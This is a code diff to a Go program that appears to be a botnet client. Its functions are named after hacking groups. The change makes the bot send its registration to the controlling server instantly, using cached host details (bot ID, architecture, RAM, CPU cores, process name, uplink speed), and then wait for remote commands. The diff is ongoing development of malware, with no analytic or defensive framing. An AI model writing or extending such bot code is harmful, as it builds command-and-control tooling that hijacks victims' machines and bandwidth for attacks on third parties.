@@ -246,16 +246,11 @@ func anonymousSudan(conn net.Conn) {
 		return
 	}
 	deoxys("anonymousSudan: Authentication successful!")
-	botID := mustangPanda()
-	arch := charmingKitten()
-	ram := revilMem()
-	cpu := revilCPU()
-	procName := revilProc()
-	uplink := revilUplinkCached()
+	// Use pre-cached metadata so REGISTER is sent instantly (no speed test delay).
 	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores, Proc: %s, Uplink: %.2f Mbps",
-		botID, arch, ram, cpu, procName, uplink)
+		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)
 	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d:%s:%.2f\n",
-		protocolVersion, botID, arch, ram, cpu, procName, uplink)))
+		protocolVersion, cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)))
 	deoxys("anonymousSudan: Entering command loop...")
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
